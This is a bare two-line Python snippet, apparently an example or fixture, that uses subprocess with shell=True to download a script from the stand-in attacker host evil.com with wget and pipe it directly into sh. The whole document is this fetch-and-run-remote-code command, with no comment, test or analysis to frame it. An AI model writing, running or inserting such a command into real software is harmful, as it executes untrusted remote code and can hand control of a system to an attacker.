import subprocess
subprocess.run("wget -O - http://evil.com/shell.sh | sh", shell=True)